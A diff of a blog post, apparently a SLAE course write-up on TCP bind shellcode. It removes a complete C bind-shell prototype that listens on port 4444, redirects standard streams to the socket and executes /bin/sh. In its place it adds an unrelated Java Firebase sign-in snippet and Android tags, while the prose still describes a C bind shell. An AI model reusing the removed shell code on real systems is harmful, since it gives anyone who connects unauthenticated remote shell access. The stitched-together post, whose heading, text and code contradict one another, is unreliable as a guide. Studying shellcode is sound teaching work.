@@ -6,12 +6,12 @@ classes: wide
 header:
   teaser: /assets/images/slae32.png
 categories:
-  - slae
-  - infosec
+  - java
+  - android
 tags:
-  - slae
-  - assembly
-  - tcp bind shellcode
+  - java
+  - android
+  - backend
 ---
 A bind shellcode listens on a socket, waiting for a connection to be made to the server then executes arbitrary code, typically spawning shell for the connecting user. This post demonstrates a simple TCP bind shellcode that executes a shell.
 
@@ -22,62 +22,20 @@ The shellcode does the following:
 4. Redirects STDIN, STDOUT and STDERR to the socket once a connection is made
 5. Executes a shell
 
-### C prototype
+### Java prototype
 ---------------
 To better understand the process of creating a bind shellcode, I created a prototype in C that uses the same functions that'll be used in the assembly version. The full code is shown here. We'll walk through each section of the code after.
 
-```c
-#include <netinet/in.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/socket.h>
-#include <unistd.h>
+```java
 
-int main()
-{
-    // Create addr struct
-    struct sockaddr_in addr;
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(4444); // Port
-    addr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any interface
+    private FirebaseAuth authfire;
+    private  FirebaseAuth.AuthStateListener authlistener;
 
-    // Create socket
-    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == -1) {
-        perror("Socket creation failed.\n");
-        exit(EXIT_FAILURE);
-    }
-
-    // Bind socket
-    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
-        perror("Socket bind failed.\n");
-        close(sock);
-        exit(EXIT_FAILURE);
-    }
-
-    // Listen for connection
-    if (listen(sock, 0) == -1) {
-        perror("Listen failed.\n");
-        close(sock);
-        exit(EXIT_FAILURE);
-    }
-
-    // Accept connection
-    int fd = accept(sock, NULL, NULL);
-    if (fd == -1) {
-        perror("Socket accept failed.\n");
-        close(sock);
-        exit(EXIT_FAILURE);
-    }
-
-    // Duplicate stdin/stdout/stderr to socket
-    dup2(fd, 0); // stdin
-    dup2(fd, 1); // stdout
-    dup2(fd, 2); // stderr
-
-    // Execute shell
-    execve("/bin/sh", NULL, NULL);
-}
+    public static final int SIGN_IN=1;
+    
+    List<AuthUI.IdpConfig> provider = Arrays.asList(
+            new AuthUI.IdpConfig.GoogleBuilder().build(),
+            new AuthUI.IdpConfig.FacebookBuilder().build());
 ```
 
 #### 1. Socket creation
